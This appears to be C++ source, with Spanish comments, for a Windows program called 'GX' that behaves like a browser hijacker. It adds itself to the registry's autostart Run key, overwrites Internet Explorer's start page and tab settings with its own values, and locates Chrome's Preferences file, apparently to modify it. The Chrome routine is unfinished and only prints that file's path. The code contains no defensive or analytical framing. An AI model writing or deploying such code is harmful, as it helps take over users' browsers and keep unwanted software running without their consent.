//Librerías Principales
#include <iostream>
#include <windows.h>
#include <string.h>
#include <fstream>
//#include <stdlib.h>

//Librerías Secundarias
#include "Global.h"

//Espacios de nombre
using namespace std;

int main(int argc, char *argv[])
{
//Asignando Valores

//Creando cadena para el registro de windows
ruta_sin_comillas = string(argv[0]);

strcat_s(ruta_actual,"\"");
strcat_s(ruta_actual,argv[0]);
strcat_s(ruta_actual, "\"");


//Creando cadena para la ruta de Chrome
ruta_chrome = ObtenerValorRegistro(ruta_applocal_reg,consulta_applocal);
ruta_chrome += "\\Google\\Chrome\\User Data\\Default\\Preferences";




/*########################################################
############### LLAMADA A LAS  FUNCIONES #################
########################################################*/

ComprobarGX(); //Comprueba si existe GX, lo actualiza en caso necesario
InyectarIE(); //Inyectando IE
InyectarCH(); //Inyectando CH
cin.get();
}


/*########################################################
############### DECLARACION DE FUNCIONES #################
########################################################*/

//Comprobar si la ruta existe en el registro #1

bool ExisteRegistro(string Ruta)
{

	HKEY llave;
	if (RegOpenKeyEx (HKEY_CURRENT_USER,Ruta.c_str(),NULL,KEY_READ,&llave) == 0 )
	{
	RegCloseKey (llave);
	return true;
	}
	RegCloseKey (llave);
	return false;
	}

//Obtener valor del registro #2

string ObtenerValorRegistro(string Ruta, string Consulta)
{
	HKEY llave;
	DWORD buffer = 1024;
	char* datos = new char[buffer];
	
	if (RegOpenKeyEx (HKEY_CURRENT_USER,Ruta.c_str(),NULL,KEY_READ,&llave) == 0 && RegQueryValueEx(llave,Consulta.c_str(),NULL,NULL,(LPBYTE) datos,&buffer) == 0)
	{
	string resultado = string(datos);
	//cout << "[*] DEBUG: " << Consulta.c_str() << endl;
	RegCloseKey(llave);
	return resultado;
	}
	else
	{
	RegCloseKey (llave);
	string error = "ERROR";
	return error;
	}

}

//Guardar Registro #3

bool GuardarRegistro(string Ruta, string Consulta, string Valor)
{
	HKEY llave;
	RegOpenKeyEx (HKEY_CURRENT_USER,Ruta.c_str(),NULL,KEY_ALL_ACCESS,&llave);
	if (RegSetValueEx (llave, Consulta.c_str(), 0, REG_SZ, (LPBYTE)Valor.c_str(), strlen(Valor.c_str())+1) == ERROR_SUCCESS)
	{
	RegCloseKey(llave);
	return true;
	}
	else
	{
	RegCloseKey(llave);
	return false;
	}

}

//Eliminar Registro #4

void EliminarRegistro(string Ruta, string Consulta)
{
	HKEY llave;
	RegOpenKeyEx (HKEY_CURRENT_USER,Ruta.c_str(),NULL,KEY_ALL_ACCESS,&llave);
	RegDeleteValue (llave, Consulta.c_str());
}

//Comprobar Configuracion 
//Sino se ha instalado nunca se crean instancias en el registro para poder administrar su configuración en caso de actualizaciones.

void ComprobarGX() 
{
	
	if (ExisteRegistro(ruta_reg_gx) == false)
	{
		/*########################################################
		############### INSTALANDO GX POR PRIMERA VEZ  ###########
		########################################################*/
		HKEY llave;
		DWORD dwdisposicion;
		long resultado;
		RegOpenKeyEx (HKEY_CURRENT_USER,ruta_reg_gx.c_str(),NULL,KEY_WRITE,&llave);
		resultado = RegCreateKeyEx(HKEY_CURRENT_USER,ruta_reg_gx.c_str(),0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,&llave, &dwdisposicion);

		if (resultado == ERROR_SUCCESS)
		{
		cout << "[+] Se creo correctamente la carpeta en el registro" << endl;
		cout << "[*] Creando valores ..." << endl;
		//Creando valor de VERSION 
		if (GuardarRegistro(ruta_reg_gx,version_reg_str,version_gx) == true )
		{
		cout << "[+] Valor VERSION creado correctamente ..." << endl;
		}
		//Creando valor de RUTA
		if (GuardarRegistro(ruta_reg_gx,ruta_reg_str,ruta_sin_comillas) == true )
		{
		cout << "[+] Valor RUTA creado correctamente ..." << endl;
		}
		//Creando valor de PAG_INICIO
		if (GuardarRegistro(ruta_reg_gx,pag_inicio_reg_str,pag_inicio_gx) == true )
		{
		cout << "[+] Valor RUTA creado correctamente ..." << endl;
		}
		//Creando valor de AUTOINICIO
		if (GuardarRegistro(ruta_reg_gx,nombre_autoinicio_str,nombre_autoinicio) == true )
		{
		cout << "[+] Valor AUTOINICIO creado correctamente ..." << endl;
		}
		//Creando proceso de AUTOINICIO
		
		if (GuardarRegistro(ruta_reg_autoinicio,nombre_autoinicio,ruta_actual) == true )
		{
		cout << "[!] Proceso de AUTOINICIO creado correctamente ..." << endl;
		}
		}
		else
		{
		cout << "[-] Ocurrio un error al intentar crear carpeta en el registro" << endl;
		}
	}
	else
	{
	cout << "[*] Se detecto una version de GX instalada:" << endl;
	cout << "[*] Comprobando versiones ..." << endl;
	string version_temp = ObtenerValorRegistro(ruta_reg_gx,version_reg_str);
	int version_reg_temp = atoi(version_temp.c_str());
	int version_bin_temp = atoi(version_gx.c_str());
	
	if (version_reg_temp == version_bin_temp)
	{
	cout << "[*] La version actual de GX coincide con la instalada." << endl;
	if (GuardarRegistro(ruta_reg_autoinicio,nombre_autoinicio,ruta_actual) == true )
		{
		cout << "[!] Proceso de AUTOINICIO re-creado correctamente ..." << endl;
		}
	}
	else if (version_reg_temp < version_bin_temp)
	{
		cout << "[*] Actualizando GX ..." << endl;

		//Actualizando valor de VERSION 
		if (GuardarRegistro(ruta_reg_gx,version_reg_str,version_gx) == true )
		{
		cout << "[%] Valor VERSION actualizado correctamente ..." << endl;
		}
		//Actualizando valor de RUTA
		if (GuardarRegistro(ruta_reg_gx,ruta_reg_str,ruta_sin_comillas) == true )
		{
		cout << "[%] Valor RUTA actualizado correctamente ..." << endl;
		}
		//Actualizando valor de PAG_INICIO
		if (GuardarRegistro(ruta_reg_gx,pag_inicio_reg_str,pag_inicio_gx) == true )
		{
		cout << "[%] Valor PAG_INICIO actualizado correctamente ..." << endl;
		}
		//Eliminado registro de auto-inicio del GX anterior.
		EliminarRegistro(ruta_reg_autoinicio,ObtenerValorRegistro(ruta_reg_gx,nombre_autoinicio_str));
		//Actualizando valor de AUTOINICIO
		if (GuardarRegistro(ruta_reg_gx,nombre_autoinicio_str,nombre_autoinicio) == true )
		{
		cout << "[%] Valor AUTOINICIO actualizado correctamente ..." << endl;
		}
		//Actualizando proceso de AUTOINICIO
		if (GuardarRegistro(ruta_reg_autoinicio,nombre_autoinicio,ruta_actual) == true )
		{
		cout << "[!] Proceso de AUTOINICIO actualizado correctamente ..." << endl;
		}

		}

	else if (version_reg_temp > version_bin_temp)
	{
	cout << "[*] GX ya esta actualizado!" << endl;
	}

	}
}

/*########################################################
############### INYECTANDO NAVEGADORES  ##################
########################################################*/

//Inyectar Internet Explorer

void InyectarIE()
{

//Cambiando página de inicio
	if (GuardarRegistro(ruta_ie,consulta_ie,ObtenerValorRegistro(ruta_reg_gx,pag_inicio_reg_str)) == true)
	{
	cout << "[IE] Pagina de inicio de Internet Explorer modificada" << endl;
	}
//Inyectando Tabs de IE
	HKEY llave;
	RegOpenKeyEx (HKEY_CURRENT_USER,ruta_reg_tabs_ie.c_str(),NULL,KEY_ALL_ACCESS,&llave);
	if (RegSetValueEx(llave, consulta_tabs_ie.c_str(), 0, REG_DWORD, (const BYTE*)&valor_tabs_ie, sizeof(valor_tabs_ie)) == ERROR_SUCCESS)
	{
	cout << "[IE] Tabs de Internet Explorer inyectadas correctamente" << endl;
	RegCloseKey(llave);
	}
	else
	{ 
	RegCloseKey(llave);
	}
//Bloqueando registro
	

}

//Inyectar Chrome

void InyectarCH()
{
	cout << "[CH] Ruta del config de Chrome: " << ruta_chrome.c_str() << endl;

}



int prueba()
{
	
	char cadena[850];
   ifstream fe(ruta_chrome.c_str());

   while(!fe.eof()) {
      fe >> cadena;
      cout << cadena << endl;
   }
   fe.close();
  return 0;
}